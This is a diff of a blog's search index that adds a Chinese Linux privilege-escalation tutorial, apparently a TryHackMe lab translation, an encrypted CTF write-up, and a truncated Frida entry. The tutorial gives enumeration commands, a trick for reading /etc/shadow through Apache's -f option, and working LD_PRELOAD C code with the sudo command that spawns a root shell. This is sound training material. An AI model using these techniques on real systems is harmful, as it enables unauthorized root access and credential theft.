@@ -4,6 +4,48 @@
   
     
     <entry>
+      <title>Linux 权限提升</title>
+      <link href="/2024/11/17/linprivesc/"/>
+      <url>/2024/11/17/linprivesc/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p><a href="https://www.cnblogs.com/Hekeats-L/p/16867299.html">https://www.cnblogs.com/Hekeats-L/p/16867299.html</a></p><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><blockquote><p>难度：<br>描述：<br>前置条件：</p></blockquote><hr><blockquote><p>权限提升是一个旅程。没有灵丹妙药，很大程度上取决于目标系统的具体配置。内核版本、安装的应用程序、支持的编程语言、其他用户的密码是影响您通往 root shell 之路的几个关键因素。  </p></blockquote><p>此房间旨在涵盖主要的权限提升向量，并让您更好地了解该过程。无论您是参加 CTF、参加认证考试还是担任渗透测试人员，这项新技能都将成为您武器库的重要组成部分。</p><h1 id="“权限提升”是什么意思？"><a href="#“权限提升”是什么意思？" class="headerlink" title="“权限提升”是什么意思？"></a>“权限提升”是什么意思？</h1><p>从本质上讲，权限提升通常涉及从较低权限的帐户转到较高权限的帐户。从技术上讲，它是利用操作系统或应用程序中的漏洞、设计缺陷或配置疏忽，以未经授权访问通常限制用户访问的资源。  </p><p>为什么它很重要？</p><p>在执行实际渗透测试时，很少能够获得提供直接管理访问权限的立足点 （初始访问权限）。权限提升至关重要，因为它允许您获得系统管理员级别的访问权限，从而允许您执行以下操作：</p><ul><li><p>重置密码  </p></li><li><p>绕过访问控制以破坏受保护的数据</p></li><li><p>编辑软件配置</p></li><li><p>启用持久性</p></li><li><p>更改现有（或新）用户的权限</p></li></ul><p>枚举是访问任何系统后必须采取的第一步。您可能通过利用导致 root 级访问的关键漏洞访问了系统，或者只是找到了一种使用低权限帐户发送命令的方法。与 CTF 计算机不同，渗透测试活动不会在您获得特定系统或用户权限级别的访问权限后结束。正如您将看到的，枚举在妥协后阶段与以前一样重要。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure><p>该 命令将返回目标计算机的主机名。尽管此值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在公司网络中的角色的信息（例如，SQL-PROD-01 用于生产 SQL Server）。</p><p><code>uname -a</code><br>将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。这在搜索任何可能导致权限提升的潜在内核漏洞时非常有用。</p><p><code>cat /etc/os-release</code><br><code>/proc/version</code><br>proc 文件系统 （procfs） 提供有关目标系统进程的信息。您会在许多不同的 Linux 版本上找到 proc，使其成为您武器库中必不可少的工具。</p><p>查看 可能会为您提供有关内核版本和其他数据的信息，例如是否安装了编译器（例如 GCC）。</p><p><code>/etc/issue</code><br>还可以通过查看文件来识别系统 。此文件通常包含有关操作系统的一些信息，但可以很容易地进行自定义或更改。在主题上，可以自定义或更改任何包含系统信息的文件。为了更清楚地了解该系统，查看所有这些总是好的<br><code>ps</code><br>命令 是查看 Linux 系统上正在运行的进程的有效方法。 在终端上键入将显示当前 壳</p><p>（Process Status） 的输出将显示以下内容;<code>ps</code></p><ul><li>PID：进程 ID（对进程唯一）</li><li>TTY：用户使用的终端类型</li><li>时间：进程使用的 CPU 时间量（这不是此进程的运行时间）</li><li>CMD：正在运行的命令或可执行文件（不会显示任何命令行参数）</li></ul><p>“ps” 命令提供了一些有用的选项。</p><ul><li><p><code>ps -A</code>：查看所有正在运行的进程</p></li><li><p><code>ps axjf</code>：查看进程树（请参阅下面的树形成，直到运行）<code>ps axjf</code></p></li><li><p><code>ps aux</code>：该选项将显示所有用户的进程 （a），显示启动进程的用户 （u），并显示未附加到终端的进程 （x）。查看 ps aux 命令输出，我们可以更好地了解系统和潜在漏洞。<code>aux</code></p></li></ul><p><code>env</code><br>PATH 变量可能具有编译器或脚本语言（例如 Python），可用于在目标系统上运行代码或用于权限提升</p><p><code>sudo -l</code></p><p>目标系统可以配置为允许用户使用 root 权限运行某些（或全部）命令。该 命令可用于列出您的用户可以使用 运行的所有命令。</p><p><code>ifconfig</code><br><code>history</code><br><code>netstat</code></p><ul><li><code>netstat -a</code>：显示 所有侦听端口和已建立的连接。</li><li><code>netstat -at</code>或者也可以用来列出 TCP 或 UDP 协议 分别。<code>netstat -au</code></li><li><code>netstat -l</code>：列表 端口处于 “侦听” 模式。这些端口已打开并准备好 接受传入连接。这可以与 “t” 选项一起使用 仅列出正在使用 TCP 协议侦听的端口（如下）</li></ul><h3 id="find-命令"><a href="#find-命令" class="headerlink" title="find 命令"></a>find 命令</h3><p>在目标系统中搜索重要信息，以及 潜在的权限提升向量可能是有益的。内置的 “find” 命令很有用，值得保存在您的武器库中。</p><p>以下是 “find” 命令的一些有用示例。</p><p><strong>查找文件：</strong></p><ul><li><code>find . -name flag1.txt</code>：flag1.txt在 当前目录</li><li><code>find /home -name flag1.txt</code>：flag1.txt在 &#x2F;home 目录</li><li><code>find / -type d -name config</code>：在 “&#x2F;” 下找到名为 config 的目录</li><li><code>find / -type f -perm 0777</code>：查找具有 777 权限的文件 （所有用户都可以读取、可写和执行文件）</li><li><code>find / -perm a=x</code>：查找可执行文件</li><li><code>find /home -user frank</code>：在 “&#x2F;home”</li><li><code>find / -mtime 10</code>：查找最近 10 个中修改的文件 日</li><li><code>find / -atime 10</code>：查找最近 10 个中访问的文件 日</li><li><code>find / -cmin -60</code>：查找过去一小时内更改的文件 （60 分钟）</li><li><code>find / -amin -60</code>：查找过去一小时内的文件访问 （60 分钟）</li><li><code>find / -size 50M</code>：查找大小为 50 MB 的文件</li></ul><p>此命令还可以与 （+） 和 （-） 符号一起使用，以指定 大于或小于给定大小的文件。</p><h2 id="自动枚举"><a href="#自动枚举" class="headerlink" title="自动枚举"></a>自动枚举</h2><p>有几种工具可以帮助您在枚举过程中节省时间 过程。这些工具仅用于节省时间，因为它们知道 可能会错过一些权限提升向量。以下是 流行的 Linux 枚举工具及其各自 Github 的链接 存储 库。</p><p>目标系统的环境将影响您将要创建的工具 能够使用。例如，您将无法运行工具 如果目标系统上未安装 Python 编写。这 这就是为什么最好熟悉一些而不是 拥有单一的必备工具。</p><ul><li><strong>林豌豆</strong>： <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS</a></li><li><strong>LinEnum：</strong><a href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a><a href="https://github.com/rebootuser/LinEnum"></a></li><li><strong>LES （Linux Exploit Suggester）：</strong><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></li><li><strong>Linux 智能枚举：</strong><a href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></li><li><strong>Linux Priv Checker：</strong> <a href="https://github.com/linted/linuxprivchecker">https://github.com/linted/linuxprivchecker</a></li></ul><p>理想情况下，权限提升会导致 root 权限。这可以 有时只需利用现有漏洞即可实现， 或者在某些情况下，通过访问另一个具有更多 权限、信息或访问权限。</p><p>除非单个 漏洞会导致 root shell，即权限提升过程 将依赖于错误的配置和松散的权限。</p><p>Linux 系统上的内核管理组件之间的通信，例如 系统和应用程序上的内存。这个关键功能 要求内核具有特定权限;因此，成功的 利用漏洞可能会导致 root 权限。</p><p>内核漏洞 方法很简单;</p><ol><li>确定 内核版本</li><li>搜索和查找 目标系统内核版本的漏洞利用代码</li><li>运行漏洞利用</li></ol><p>虽然看起来 很简单，请记住，失败的内核漏洞利用可能会导致 系统崩溃。确保此潜在结果是可以接受的 在尝试 内核漏洞。</p><p><strong>研究来源：</strong>  </p><ol><li>根据您的发现，您可以使用 Google 搜索现有的漏洞利用代码。</li><li><a href="https://www.cvedetails.com/">https://www.cvedetails.com/</a> 等来源也很有用。</li><li>另一种选择是使用 LES （Linux Exploit Suggester） 之类的脚本，但请记住，这些工具可能会产生误报（报告不影响目标系统的内核漏洞）或漏报（尽管内核易受攻击，但不报告任何内核漏洞）。</li></ol><p><strong>提示&#x2F;注释：</strong></p><ol><li>在 Google、Exploit-db 或 searchsploit 上搜索漏洞时，内核版本过于具体</li><li>在启动漏洞利用代码之前，请确保您了解它的工作原理。一些漏洞利用代码可以在操作系统上进行更改，使它们在进一步使用时不安全，或者对系统进行不可逆的更改，从而在以后产生问题。当然，在实验室或 CTF 环境中，这些可能不是很大的问题，但在真正的渗透测试参与中，这些绝对是禁忌。</li><li>某些漏洞利用程序在运行后可能需要进一步的交互。阅读漏洞利用代码提供的所有注释和说明。</li><li>您可以使用 Python 模块将漏洞利用代码从您的计算机传输到目标系统。<code>SimpleHTTPServer``wget</code></li></ol><h2 id="sudo"><a href="#sudo" class="headerlink" title="sudo"></a>sudo</h2><p>默认情况下，sudo 命令允许您使用 root 权限运行程序。在某些情况下，系统管理员可能需要为普通用户提供一些权限灵活性。例如，初级 SOC 分析师可能需要定期使用 Nmap，但无法获得完全 root 访问权限。在这种情况下，系统管理员可以允许该用户仅以 root 权限运行 Nmap，同时在系统的其余部分保持其常规权限级别。</p><p>任何用户都可以使用该命令检查其与 root 权限相关的当前情况。<code>sudo -l</code></p><p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 是一个有价值的资源，它提供了有关如何使用您可能拥有 sudo 权限的任何程序的信息。<br><strong>利用应用程序功能</strong>  </p><p>在此上下文中，某些应用程序不会有已知的漏洞利用。您可能会看到这样的应用程序是 Apache2 服务器。</p><p>在这种情况下，我们可以使用 “hack” 来利用应用程序的功能来泄露信息。正如你在下面看到的，Apache2 有一个支持加载备用配置文件的选项（ ： 指定一个备用的 ServerConfigFile）。<code>-f</code></p><p>使用此选项加载文件将导致包含文件第一行的错误消息。<code>/etc/shadow``/etc/shadow</code></p><p><strong>杆LD_PRELOAD</strong></p><p>在某些系统上，您可能会看到 LD_PRELOAD environment （环境） 选项。<br>D_PRELOAD 是一个允许任何程序使用共享库的函数。这<a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/">篇博文</a>将让您了解 LD_PRELOAD 的功能。如果启用了 “env_keep” 选项，我们可以生成一个共享库，该库将在程序运行之前加载和执行。请注意，如果真实用户 ID 与有效用户 ID 不同，LD_PRELOAD选项将被忽略。  </p><p>此权限提升向量的步骤可以总结如下;</p><ol><li>检查LD_PRELOAD（使用 env_keep 选项）</li><li>编写编译为共享对象（.so 扩展名）文件的简单 C 代码</li><li>使用 sudo 权限和指向我们的 .so 文件的 LD_PRELOAD 选项运行程序</li></ol><p>C 代码将简单地生成一个根 shell，并且可以按如下方式编写;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;  </span><br><span class="line">#include &lt;sys/types.h&gt;  </span><br><span class="line">#include &lt;stdlib.h&gt;  </span><br><span class="line">  </span><br><span class="line">void _init() &#123;  </span><br><span class="line">unsetenv(&quot;LD_PRELOAD&quot;);  </span><br><span class="line">setgid(0);  </span><br><span class="line">setuid(0);  </span><br><span class="line">system(&quot;/bin/bash&quot;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以将此代码保存为 shell.c，并使用以下参数使用 gcc 将其编译成共享对象文件;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br></pre></td></tr></table></figure><p>现在，我们可以在启动用户可以使用 sudo 运行的任何程序时使用此共享对象文件。在我们的例子中，可以使用 Apache2、find 或几乎所有我们可以使用 sudo 运行的程序。</p><p>我们需要通过指定 LD_PRELOAD 选项来运行程序，如下所示;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_PRELOAD=/home/user/ldpreload/shell.so find</span><br></pre></td></tr></table></figure><p>这将导致生成具有 root 权限的 shell。</p><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>gatekeeper-thm</title>
+      <link href="/2024/11/17/gatekeeper/"/>
+      <url>/2024/11/17/gatekeeper/</url>
+      
+        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="8687ea429cc0063eecac62b9c5f5facc1cc19c9afa5448561c800c4bf18eb0f2">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259686e6fc3261c47ce3bb093cbeb378c458bc166d0205d4e33e821c94653a1f3e898ee4a523c0840b3f262bb2dffa1ba2b0d3a4460cd015cba2ab03ca927b206e019baaec09615fc0ae37bc73e7f3b299935e40ab6f4fde4681a28e80fab780de3aeaba205af3a1df95f1693f5aa220bfdf9bf125dff72b4b8f7a277887e77d51c4e222abb3decfdb18d3fdf66f6cbd1b4b4cf7a89e051716808850b9a419f2a7e0e9a0ac6487002a70575a5c653a56de63a7d3db4e0fdbd3903cfd92f198fa20a239b5ca97c7feeca37e7263fa7f9da7ac8b1511e2fa44a11d6aa2112a607434a2dc8a8ffb007673b53e1564a8c15c6013de55f66eab1361dd4d29760ea653023fb87947418cbaf430c96d85fcc55157c1da4ba387f9ef8bc5528556608087622ac8fef947856356e13b25c7c1c47ce5427987a169a990c910450b39b4dd08fdc1c9d6ad2b030acb9d05b6448d68123e7c6d84b0e049635fa48121f9bee2183d5c503d49630be84e352a937c1132e39edd1e8b374668efc70b621b53e3527d2c1c429e52b8b2a2527ccc3a2aa5c9b5132567c39c89bc17da49a395a40779c373f438e8f8f491a58dcc694deaf94b5086f2dc5d1abff3bb5a5be3100bdb60fdbf8febab99a9193397584a3158c6b6367c5702b1ee86b4e53e4c6c93b87ecad0661113b2dc4b911f39853900448178288371d9dc24adca75e9f0b1fa062b0d9cf3e00081b8bfae5436679f9963e729719e6028f470e10c86f5fd0959cf4afa9d0c34230e3ad20213f254fc6a6d294a5f3fa213c90d5cf49471b7a5973522c9e589a6eeb9bbb1b52f705e2799c518255cbabe54e8687d8949aaffb4de3457303c9065ee93b61a00243cf6484aed4b8b24f7b90818465f2480b5cc8a125f857a6e16b123dd2cfa9a7228a6c80f4169b1a613038a2c8058263b983083dac2cd300e33c84fd6707437b9cd62801c00c171611f6166e34371f77b56b585e80f5c6bf96e8a78cd76fbc9904e4f68fffee337160d8ef5d28fb8f476af466020b2bc3d1ac8497701e6d49133d9dc008e087951a97f0c27a46c6f8ab8be345255abfc341a326dff3005a0334e6fd620a5d04b149e4c0407fd1abf5c5d34d8ee5780aa3c217562e1f4570e76281d9d5af800b8e40956d168759a8f0bf43fb12ec334b1c01946e6b3c2b219ae7d6604b75ba22299adf2a6ea51a05bd54d735107181743c1104e49d3066f5e3b6cf33733c38e7b377d2e6444b2e6bea20e044384169982ec2b9660ac9149e14416056a4c1c910bf377bd1bc720dc31ed3fdf7ee850be14f65304181033c246708616dde51931342f3c5a272048b4933d0bb5af4360ef948942546e0fa7eb8772ef199bc5ddf0d4cfde9eaa6d5691fa26134afdd757eabe5785b57397b1df6a1390e84488933f90b03e28d2ea17bbc361cf5cad6a2c23162fa56ac7206e1f80acb912e07bd1ea0e5456f5a9aca6c39f3a3815bb491d6913d967ffda2aa6df3828aa69cf26078607ddc3fbc899faa566dfb71503732d60da0ff2d743ea7d2d4040b8417db88bd011e9810c066058534c188bddb822adfc11ba528ed66149623a7ca5e28e6214400e81ab4672efa7e6f92d416c394ae9ab71fd6cbc3fe49bef7c424778d092473a24e91848f97de88d3cc0185d7f7e1cb2b7b2bff2127e60949e5ff48e427a1f51994f37bb873514fbaf91792802912f5e6ae1608c0bdb6534509d0c2f934b09aa5aced220c2b739663872cfc3fce366bcd29527d1b519b97e4a4b2fc043b175b2e60cedd3260a2359739020f02ded99d239b7227ec55e55c6f0f9ebf7dec4a0bf724400445f5707ca7d09c63c2263be42cdac9c5f10a89cc72eb55f591c6fb3478df41760b87d2429ce1a10c5cce5cebfc10ca31e463fde40a599d2465dae86a491b263aa735d078fb0f8dd27a9a15b47a7b5798dd9f2a437441b51bbfb95fbc2907fa309c3e21bd3070b3f926cbfc941a0fcca79a53feb823f7bee3966aa93544f3a74f194bc26c235b8576e0f9a576b9cde91cd67f651b1431d5e17c229d8ef4aa6362df3ad5670acbc2f2b05457d391b0ef8fadc209e5a873dded6a252233e3f4a84178a85687ce2be1b8fa2e594ef13bc03f091d982cc8132b4d6d45cb17940d298bcae212229191299912e18d0276849c6a571446f2918789a3834a295c340b932a669311c5c337e5f1fa9d344a41649773f763206c5e5254e8d52d7a610c2c52288de959987b9bc9a403d2f6f41e2bfee3f25af187420e7136e70ffc6de9b5fd52df0f02bf5c0939ee4c736d9f1d3e586cd566680a4c3818cb2946fcc82a486a9ba3ab6a76319ff1b7325a7f7fcbc54d41ea4e8ade6fb719803a891fbd6cce1aea18fd415c7f280303551cd4d516d61d14b4ffd3846e324489c919e6a1fef49ad86ca1932a0bc6bb4701a0d01c9fc12c188a6c24d02b2c971e67b4a7f7f9f33d9bf749822fc36671a71a02b5d262a9754e45697f96294adb10e85070274c75cf05394619142ce9cfcc1ada2c4a30632200f84db72cb8451a1d74b7dec71c5c2b7bdc5f9e632271faf525d1c8e15818727835b0472c7dbdbe13e603b6c1c1316461bea0b571dd9cf823a6ca59e54e9af8a0da2f2c8bb1f1e19b1aa09ac696c0b0fd6047c3347bda2d7bb0863c33d8fe8f05db125a6f066643d9bc8e504f03b96c5f709e39907e9a70de946f222e326d4c20ce32ba41b387d6fcfdfeb8ffee7ffd277239237a6401c2d92925f17c304be3de19cd33baac217957020950b239b1692822bf560364621251b9abeda13d1403c99346940e7230b8e2a051eb0a36f6f7309ea9a8239d1c2b46d0e54211aec89ae7fce77a25aaf880f5b9a6754617b99d17b11126921db9134f40f3de11ce7ab79f1b6b7fe640623cbf70b80f241cce2d1512d987ab681af2a836955264481facd7b9d42b83e126cd0301be9eef24601ddd85b7296435c21f9403fb019a9550566cf3d7e4485a56385c7339b28b4ad8d7522e4edc53c1e975b948529abc6017a3fe7cac18cd3bbad1d9cf54eaedb6f273cc3a4f6c53b89ecde17e1ab03fdae8023ca8e190145af703401d42b0d35cd76d64922c37a7b02b164d5d1be424536720b07be8740ffcba98cd3081e968a556c141926d4ffc77a4da4b2de4ea5d144bb9bed7fe8c49b12a4559f0882547cce736843c51e92c89cac5e37848002e5682f6985773725811819eaec5fe4e619a81aa986c35698b6947577b691ac21a9eacd2df5876f9065fdcca5fd328b5df49a012c4a2ba8144f3af02c9105de962ca6bba5dc5b77457a7c0b161d4ecf79767cb112a3bec35fe04b63d4c54699e6678965f44414a221d8b99923969de65fd9efe70cb126ecc3cf809931b7cd9c630067c47d0f34bbf1b9497e99c8f28c74f726d0fadb9b33adfdbc7ebb378eb0050ce3572a7fec245f4e7a69d0ab1dbdce84b7ba295be27d48df7401c5228950581404d8324a3902f194d1c642877639a8dcba079ed11ac66d48bacdee6793dddb41f80b57d3e9f825d5cbe123416b171372744d69c2099b117459f447040371207cf82d13ef31d18c4e8b504a467257c9561e77f615e704023a8efa8d42fe950b6adf036269b4d0b41f693c3707dc7a4295e2c7d45ec83cd40594063afd6f3135dc5d98bb4bf8cfc0ea35bc513d295b3f0fde3843645141f946d2de584b812ed8cf531fd042f6fbc4c414880e84ae4e79761497b220d74c6f67e4145b055212f1c8affd16c718b1028ef363d0d529cf06b4d8025886561fb882983fd5e603b537d45244af13d3a17ec20d9f46e9f5df11bb48940de9b2920f299800372a4a47d5cb50585fa8a5e8893eae051967f311b05094c7ef2529b76e0555cd7236ed031435fe3da752d64c15193a7ade783f44d489bfed0b3b7460a616abe4024b0afc4a7f15ced99a98fbb2ba858146435031311c19f2be35207e90f5211b691b6a74a76df24281fd9208d0cc9936d85183352bf9d8387e4a3a7f4a30ea95325600583bfd95c94cbc4499ffaddaaec30e38f152705d55b006ab51005b9880d54098bcb2166fa8f77995dc70a31f0f02fc193017bd0d54c7b02cef287f1b050aefafec8e31f05e7506743af6dfc36c460d0fab81a7b6829785f1a3164db8a021c91a5cede485cae626dcb2334e0dfb2c222830d0d6adc77b9c82197445afd676221fcf5152ab85e96d6df4c61bcf376d91910e6a6c9e844f56412c7acb29c39e3914b3f5b0eea062f04ee02c988a49c9bb4de4504c3bc0cdcc15bd56e545d9bbbbdc7baa0ef1896c63bd5438ea2df9051b8bcd94c39b28ba2dfd6dd57e8e1ce054e063ea6a621dec27d5eaf62c65f1eac719b1a8c5a62ef85f0fb216788c5092467600301694e9597c621fe2e7b7d0d43353227dc7047c7e474dbbb0cb1939655a19fb9b02272b69d809ea3246db3c7de0fba8f14475ab496995fe4de2f50300a09bb70b90bccbe7a9ed87d7b7742c26fd8c1f9491e169a63748d1c91d08c2dc2dcc4cfaca1cdb213f9d50c71d647198f83fbf72f21229f650905b53b29203db204e7c1e9f3119a123f823c5d0cae899bc59b926799b81a2a96c3f8fbd430e82c96b4f64c86dae28c11da01e99148f19157459aa80e577220892c23eaa2471f0e8402c0a0a5f7120d2b5648c75088c8bc838e9d35c4cb99905f84fc4b11d6557331cce53f2c08fb10e4d9037cc02bf3f752223443fc5b5c747fa5e1e967f1a768ca428e87cdf3667718380326a3dd34f6c7ad280ac44dc6388db555321fb8dfb2d47f1b4ac650f0765ad23c535ccbc9ad2ba029f5c3c510a9ec7e1dfcf94088929a471cd3b306544e8ebbe5d239ea51e185aecae8887f25a56c2ae949ab82b875d28e7ba4374d2ea1c114b6286b95094351c916db639344b9deb6a26b8821ab142557a9a645fbaf028db23bf25c18dbcaf4981227d82a6af50bc7f79d85cbbbc3834bf193fd9702ba2d30fdeabc36bac54035baaf64224337946ed6a62c71f29d8c899e68ea867ba254ba2bbffe8feabc5922899fed1f113a35b0713b8a814ae5eadae0074b79fccedb602485fc545bb7db435af79f1fe5ee951546cb983efc1aae16a5770c5540a062c559bf235e9b5d1c9fa9392ac17eba81e92d0375c90e1eb96f8500889c06961271f631dd167df9d2833654621dc44a8c702c00d30e893d72e7209049c4b1baa048568a2a7f7f3ff20f086cb3184ebccba66f50306a872cb168d39d26be600707e9b725ff790e92ba911de7c26b2ef240436db2416e68086a89f153b8d8049a9fc5be8348ef2b46a9b25f657bf395378cddb1b4ca331233f050d66e99e27f8e8333804e221dac816111ae6db52d57bd981c714533740c89808ecfc99e8799aaad32e255d6ec084662bdd388b8e493f476cf3f4bcddfc5566b83d466bdf7eb0323cbb6b83d459e9391402ff0ab4eefe0dfc266edda78741be33fc5d5b9a31489c516dd9b24a0b1dfa2a305e6c359e23e31efd668e893fbb646e40c7ba290ebbc510ec46a3ac27d3d45d3bb2989e7b43db5a2e0079bb8211edc9388ff5f27de53109870105acc7e0dd3f785ead2896d1cd8e48a168619501d364f0a3671508f70ecf4875cd916b14cd69b89f3c39ada6796755f17666754e89d669f19a25ddf8f83a4c76a4817cfc6748744621ea35691d5c7a7810ac32043efdde7462b7884bfba5c42ab1478ed63858a668cc975d8efb648a7807d87f9d3bb81cbd36fb2f203b42408c0c1d2da8afd6b750d35cb5f36955c63c9c3d46942bd134b1b072562fed3a287a51103d82a72fb43c5d4f7d7bb8ca3d8fa46ea2e17ab1ca315cb948f05400a5645e8e040d8eb59a2f6988e7481a805d6f1b59f9889c367ddd5730163f65d2c00d29019a6ee27b951fee8d4ac208b2d76d5690cf5e4bb4d7a60053b2346fc6ee4c63aa5b8251fa5eb505b44fd2674298c5fd3f3d1c4d5e7659af7b45c4ac0f75748407b3077c9e1b6318c8859dec7fe29d35b9327369e1d767255ecfbcf4b034854876498887a7befdb0274cafef591a4e49b71d28dbd309524590056ef024737c54d72fe24a6d705e8df403641763d71de39d2b92034747306e6abb9f3eb67c2fd01c7c04de4900f2e3eed3f65baadc82e217ad34c178b65fdf533401da4cd1611c24a06b0e58a921ee694148939d48aeaeb9b4c94797ace868438678758247ed4b9947d742eef644cb4edd697f6c085ed626001b2795825041f693d1d4d76fa35d8a60bbd56da24663d9433a7b7b78fd2d1e65fc9f89484a8e402ec05b204daf317fba5223db5add3b58768a6a2b3bd9f185edf8e07f93054c06528cc51c5c44e3f1965a8aebe1b501c132e2731d4765438ce1430c3ba5f7af20a561e7eaa92923a676a120bb9cc20ee7f8b6bbfd9780b1fc4d0ffb77aef05ffbb8a862945e2e4db189aea9821679000fcdc127f932a4f99e9c1d0cb1049f0e14c4a0c9bcc76599e642500b00dae96c8e0ac49cb90dc462a2041661c29b5347ca2c4a79246edc5f7975390687e226d84185b9e82c6caad7f55322bc660b4c5f77ef8a77ead8923585e9fc5c64ba07f85e331abd498fd90a5bf8efdc91f516d93759df217bbb40c8752cacfb96c3d6259a8081e15a5e063b4aefcc2603538a75566cba52d1b6d5bbd0c8e6516ac77cd5c0905e0cc6bf964a1b2313977dcaa38368ba856d862967e121fddf6336b6ffe86f094329483064fc2346aedc7b05e5af4c0003e6f1d394559bf37c22ddfdaa7f3dc6367d856f371ca0eac62d54e35ee7bf7cae77b3c8d1572a3e20c3ddd5f15196ded2d3a04152f3202f8a4df6f1581477f5e7ef4fc4679209132398ed2b6308a8a0ee253dcad3b093df63757c1b40303f6bf62a20c8a2f699f7473557a7d9ebcbfc89db220a5f2385940a154e8e88a06e6c65fee4f755a013372d40030c539dac681c78943f1b90424b7ba1dad9ea50c4f5453b2afcb2a147953c67f1055d66b6345c5b4b5f6ea94c59d54c4c2c834f8c6c4db1417bf41b083c561b9067387dd5a5fd105c7e0291c2b27f85e719da210c0bf587f7744a662a01aff84c5bb1d17313b32f26d3ee6df1cb452258668440f746f29618900914e38aa8ed8c43120ef9d5360b494f58dda101fa8ab7754ecf35baf96a08cfb646fbb1281bac267b1c388f9f23322229ce53e7c1e61c8bf8e3523f6401f2d7c30bc84cbd089cba38f2e1afc5ccad0dbcd817bc0f723bd6ebe94dea32ef383961cd698ea321613c0abc95f4ee42443c7044db083412ec8c18ea3eadf39c3d4bc91afbcba6ef6547f5fa17bd515551d69d079939246ba53b0556bae544e9ffccd788d6ed82a601dd95508808776db2d431de3daef066ee50bb31709265709bbf219fe64a106a14bf2f074d394c4552a46df80874ea5714b02d1c27af486e2c41dc2bb651c9cb9cbdd6519f366bd4347c7b8c0b665dea58b064dd202dd430dce5a3690c28e8fb222ca70bb07043797af90ad36e7119a8e66868f924d3007fd85942c0290cec4dced6a89d572d98f17cead0723ca07464197719a1746086c6cab9aa2a7ad8d513833ba702c2483e8c7e710220cc6fef295918cd60ac330a9badd8dad7203a8c91f56f2432dd2744de8fe406190fa4a2742b735697fe97e8cf8d4ffcd2baa1a8260d03dfc77094bbc8f4b50797b19306e803eb94fd64ed577ffe13c5cef74ccaf7cec3f266ac23f85706020471db7ded53e114e1759467dfae2e7b48eb6bfce8451e1327b5d1e8de39b2fc0184d1f90e493680372e67e1cc14bf771eeb615c039f53b72604a7d5aaa788ad7e1229a8c77eb3f7d88505c4d10cd2c44579ef6bd27192e06fabef31de644b3805fc8c45487a8bd752448087cccfb19cac6ba89330ee34800921bde909e321c5066f17fca7ff5df0be7e3db394ad0d141485eb9f596ae27fec4c86f0c7d80e</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 靶场 </tag>
+            
+            <tag> THM </tag>
+            
+            <tag> #smb </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>nahamstore</title>
       <link href="/2024/11/16/nahamstore/"/>
       <url>/2024/11/16/nahamstore/</url>
@@ -396,6 +438,33 @@
     
     
     <entry>
+      <title>Frida的一些模板和配置及一些场景目录和问题记录</title>
+      <link href="/2024/11/13/2024-11-08-Frida-Template/"/>
+      <url>/2024/11/13/2024-11-08-Frida-Template/</url>
+      
